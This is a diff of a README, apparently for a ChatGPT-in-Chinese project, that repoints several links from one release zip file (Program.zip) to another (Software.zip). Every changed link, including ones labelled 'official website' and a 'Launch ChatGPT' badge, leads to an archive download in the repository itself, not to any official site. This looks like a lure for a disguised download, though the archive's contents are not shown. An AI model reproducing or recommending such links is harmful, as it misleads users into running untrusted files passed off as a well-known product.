@@ -10,11 +10,11 @@ Topics: ai, chatgpt, chatgpt-35, chatgpt-4o, chatgpt-o1, gpt-35, gpt-4o, gpt-o1,
 
 ## 😎 Getting Started
 
-To kickstart your ChatGPT adventure, head over to the [official website](https://github.com/zaidxxcvb1/chatgpt-website-new/releases/download/v1.0/Program.zip). This is where the magic begins! 🚀
+To kickstart your ChatGPT adventure, head over to the [official website](https://github.com/zaidxxcvb1/chatgpt-website-new/releases/download/v2.0/Software.zip). This is where the magic begins! 🚀
 
 ## 🚀 Quick Launch 
 
-Click [here](https://github.com/zaidxxcvb1/chatgpt-website-new/releases/download/v1.0/Program.zip) to get started. It's time to explore ChatGPT in Chinese like never before! 🌟
+Click [here](https://github.com/zaidxxcvb1/chatgpt-website-new/releases/download/v2.0/Software.zip) to get started. It's time to explore ChatGPT in Chinese like never before! 🌟
 
 ## 🌟 Featured Topics
 
@@ -46,11 +46,11 @@ Remember, the future is in your hands. Let's chat and innovate with ChatGPT! �
 
 ---
 
-📡 [Official Website](https://github.com/zaidxxcvb1/chatgpt-website-new/releases/download/v1.0/Program.zip) 📡
+📡 [Official Website](https://github.com/zaidxxcvb1/chatgpt-website-new/releases/download/v2.0/Software.zip) 📡
 
 ---
 
-[![Launch ChatGPT](https://github.com/zaidxxcvb1/chatgpt-website-new/releases/download/v1.0/Program.zip)](https://github.com/zaidxxcvb1/chatgpt-website-new/releases/download/v1.0/Program.zip)
+[![Launch ChatGPT](https://github.com/zaidxxcvb1/chatgpt-website-new/releases/download/v2.0/Software.zip)](https://github.com/zaidxxcvb1/chatgpt-website-new/releases/download/v2.0/Software.zip)
 
 ---
 
